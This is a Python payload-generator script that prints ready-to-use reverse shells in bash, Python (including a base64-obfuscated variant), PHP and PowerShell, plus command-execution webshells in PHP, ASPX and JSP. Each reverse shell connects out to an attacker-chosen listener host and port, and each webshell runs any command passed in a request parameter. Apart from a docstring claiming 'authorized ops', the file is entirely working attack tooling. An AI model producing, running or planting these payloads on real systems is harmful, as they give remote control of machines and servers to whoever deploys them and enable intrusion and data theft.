#!/usr/bin/env python3
"""fox-payloadgen.py — generate shells/payloads variants for authorized ops.

Quick rev-shell / webshell generators (bash, python, powershell, php, jsp, aspx).
Wraps common patterns so Fox doesn't craft from scratch each time.

Usage:
    python fox-payloadgen.py lhost 10.0.0.5 lport 4444 --shell bash
    python fox-payloadgen.py lhost 10.0.0.5 lport 4444 --shell python
    python fox-payloadgen.py --webshell php --url /uploads/fox.php
    python fox-payloadgen.py --list
"""
import argparse, os

def bash(lh, lp):
    return f'bash -i >& /dev/tcp/{lh}/{lp} 0>&1'

def bash_179(lh, lp):
    return f'0<&196;exec 196<>/dev/tcp/{lh}/{lp}; sh <&196 >&196 2>&196'

def python(lh, lp):
    return ('import socket,subprocess,os;'
            f's=socket.socket();s.connect(("{lh}",{lp}));'
            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            'subprocess.call(["/bin/sh","-i"])')

def python_enc(lh, lp):
    import base64, textwrap
    code = python(lh, lp)
    b = base64.b64encode(code.encode()).decode()
    return f'python3 -c "import base64;exec(base64.b64decode(\'{b}\'))"'

def php(lh, lp):
    return f'<?php $s=fsockopen("{lh}",{lp});exec("/bin/sh -i <&3 >&3 2>&3");?>'

def powershell(lh, lp):
    return (f'$c=New-Object System.Net.Sockets.TCPClient("{lh}",{lp});'
            '$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
            'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(new-object -TypeName'
            ' System.Text.ASCIIEncoding).GetString($b,0,$i);'
            '$sb=(iex $d 2>&1|Out-String);$st=$c.GetStream();'
            '$sw=New-Object System.IO.StreamWriter($st);$sw.Write($sb);$sw.Flush()}}')

def webshell_php():
    return ('<?php\nif(isset($_REQUEST["c"])){echo "<pre>";system($_REQUEST["c"]);'
            'echo "</pre>";}\nelse{echo "param c missing";}\n?>')

def webshell_aspx():
    return ('<%@ Page Language="C#" %>\n<script runat="server">\n'
            'protected void Page_Load(object s, EventArgs e){\n'
            '  if(Request["c"]!=null){System.Diagnostics.Process p = new System.Diagnostics.Process();'
            'p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["c"];'
            'p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;'
            'p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");}}\n</script>')

def webshell_jsp():
    return ('<% if(request.getParameter("c")!=null){'
            'Process p=Runtime.getRuntime().exec(request.getParameter("c"));'
            'java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));'
            'String l;while((l=r.readLine())!=null){out.println(l);}}%>')

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('lhost', nargs='?', help='listener ip')
    ap.add_argument('lport', nargs='?', help='listener port')
    ap.add_argument('--shell', choices=['bash','bash-179','python','python-enc','php','powershell'], default='bash')
    ap.add_argument('--webshell', choices=['php','aspx','jsp'], help='generate a webshell instead')
    ap.add_argument('--list', action='store_true', help='list available generators')
    a=ap.parse_args()

    if a.list:
        print("rev-shells: bash, bash-179, python, python-enc, php, powershell")
        print("webshells:  php, aspx, jsp")
        return
    if a.webshell:
        gen={'php':webshell_php,'aspx':webshell_aspx,'jsp':webshell_jsp}[a.webshell]
        print(gen())
        return
    if not a.lhost or not a.lport:
        ap.error('lhost & lport required for rev-shell (or use --webshell / --list)')
    gen={'bash':bash,'bash-179':bash_179,'python':python,'python-enc':python_enc,
         'php':php,'powershell':powershell}[a.shell]
    print(gen(a.lhost, a.lport))

if __name__=='__main__':
    main()
